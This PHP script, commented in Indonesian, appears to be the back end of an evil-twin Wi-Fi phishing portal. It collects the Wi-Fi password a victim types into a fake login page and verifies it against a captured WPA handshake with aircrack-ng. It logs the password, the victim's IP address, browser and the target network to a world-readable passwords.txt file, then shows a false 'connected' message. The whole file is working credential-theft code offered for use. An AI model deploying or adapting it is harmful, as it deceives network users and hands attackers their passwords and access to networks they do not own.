<?php

// Konfigurasi target
$essid           = "[essid]";
$bssid           = "[bssid]";
$file_handshake  = "/var/www/html/[output]-01.cap";
$file_log        = "/var/www/html/passwords.txt";

// Ambil data dari user
$password_masuk  = $_POST['password'] ?? '';
$ip_pengguna     = $_SERVER['REMOTE_ADDR'] ?? 'tidak diketahui';
$peramban        = $_SERVER['HTTP_USER_AGENT'] ?? 'tidak diketahui';
$waktu_sekarang  = date('Y-m-d H:i:s');

// Cek panjang password
if (strlen($password_masuk) < 8 || strlen($password_masuk) > 63) {
    die(
        "<h2 style='color:red;text-align:center;'>Password harus 8-63 karakter!</h2>
        <p style='text-align:center;'><a href='index.html'>Kembali</a></p>"
    );
}

// Tes password menggunakan aircrack-ng
$daftar_kata = tempnam('/tmp', 'kata_');
file_put_contents($daftar_kata, $password_masuk . PHP_EOL);

$perintah  = "/usr/bin/timeout 15 /usr/bin/aircrack-ng -w ";
$perintah .= escapeshellarg($daftar_kata) . " -b ";
$perintah .= escapeshellarg($bssid) . " ";
$perintah .= escapeshellarg($file_handshake) . " 2>&1";

$hasil_crack = shell_exec($perintah);
unlink($daftar_kata);

$password_benar = (strpos($hasil_crack, 'KEY FOUND') !== false);
$status         = $password_benar ? 'BENAR' : 'SALAH';

// Simpan hasil ke LOG
$catatan  = "\n" . str_repeat("=", 60) . "\n";
$catatan .= "WAKTU        : $waktu_sekarang\n";
$catatan .= "IP PENGGUNA  : $ip_pengguna\n";
$catatan .= "ESSID        : $essid\n";
$catatan .= "BSSID        : $bssid\n";
$catatan .= "PASSWORD     : $password_masuk\n";
$catatan .= "STATUS       : $status\n";
$catatan .= "PERAMBAN     : $peramban\n";
$catatan .= str_repeat("=", 60) . "\n";

file_put_contents($file_log, $catatan, FILE_APPEND | LOCK_EX);

// Tampilkan status hasil ke user
if ($password_benar) {
    echo "<h2 style='color:green;text-align:center;'>Terhubung!</h2>";
    echo "<p style='text-align:center;'>Password benar. Selamat berselancar!</p>";
} else {
    echo "<h2 style='color:red;text-align:center;'>Password Salah!</h2>";
    echo "<p style='text-align:center;'><a href='index.html'>Coba lagi</a></p>";
}
?>
